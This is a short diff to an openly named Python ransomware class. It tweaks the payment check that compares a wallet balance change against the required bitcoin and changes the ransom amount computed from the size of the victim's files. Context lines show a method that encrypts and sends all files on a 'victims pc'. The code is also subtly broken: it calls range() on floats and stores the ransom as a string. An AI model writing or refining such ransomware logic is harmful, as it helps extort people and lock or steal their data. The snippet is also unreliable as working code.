@@ -123,7 +123,7 @@ class Ransomware:
         print("balance changed by: " + str(change))
         print("Required change: " + str(bitcoin_needed))
         print("equal: " + str(change == bitcoin_needed))
-        if (change == bitcoin_needed):
+        if (change in range(bitcoin_needed - 0.001, bitcoin_needed + 0.001)):
             return True
         else:
             global initial_balance
@@ -204,7 +204,7 @@ class Ransomware:
 
     def calulate_bitcoin(self, size_of_files):
         global bitcoin_needed
-        bitcoin_needed = str((size_of_files/10000000))
+        bitcoin_needed = str((size_of_files/100000000))
 
     # Encrypt all the safe to encrypt files on a victims pc
     def encrypt_and_send_all_files(self, directory, key):
